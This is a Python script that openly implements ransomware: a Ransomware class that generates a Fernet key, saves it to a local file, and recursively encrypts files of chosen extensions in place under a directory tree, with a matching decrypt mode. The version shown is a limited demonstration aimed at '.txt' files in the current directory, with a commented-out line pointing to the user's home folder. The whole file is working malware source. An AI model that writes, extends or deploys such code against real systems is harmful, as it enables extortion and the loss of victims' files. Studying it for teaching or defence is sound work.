import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64

class Ransomware:

    def __init__(self, key=None):
        """
        Initializes an instance of the Ransomware class.
        
        Args:
            key: 128-bit AES key used to encrypt or decrypt files
        
        Attributes:
            cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed 
            file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
        """

        self.key = key
        self.cryptor = None
        self.file_ext_targets = ['txt']


    def generate_key(self):
        """
        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
        """

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    
    def read_key(self, keyfile_name):
        """
        Reads in a key from a file.

        Args:
            keyfile_name:str: Path to the file containing the key
        """

        with open(keyfile_name, 'rb') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)


    def write_key(self, keyfile_name):
        """
        Writes the key to a keyfile
        """

        print(self.key)
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)
    

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions

        Args:
            root_dir:str: Absolute path of top level directory
            encrypt:bool: Specify whether to encrypt or decrypt encountered files
        """

        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)


                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue

                self.crypt_file(abs_file_path, encrypted=encrypted)



    def crypt_file(self, file_path, encrypted=False):
        """
        Encrypts or decrypts a file

        Args:
            file_path:str: Absolute path to a file 
        """

        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                print(f'File contents pre encryption: {_data}')
                data = self.cryptor.encrypt(_data)
                print(f'File contents post encryption: {data}')
            else:
                data = self.cryptor.decrypt(_data)
                print(f'File content post decryption: {data}')

            f.seek(0)
            f.write(data)


if __name__ == '__main__':
    # sys_root = expanduser('~')
    local_root = '.'

    #rware.generate_key()
    #rware.write_key()

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--keyfile')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile

    rware = Ransomware()

    if action == 'decrypt':
        if keyfile is None:
            print('Path to keyfile must be specified after --keyfile to perform decryption.')
        else:
            rware.read_key(keyfile)
            rware.crypt_root(local_root, encrypted=True)
    elif action == 'encrypt':
        rware.generate_key()
        rware.write_key('keyfile')
        rware.crypt_root(local_root)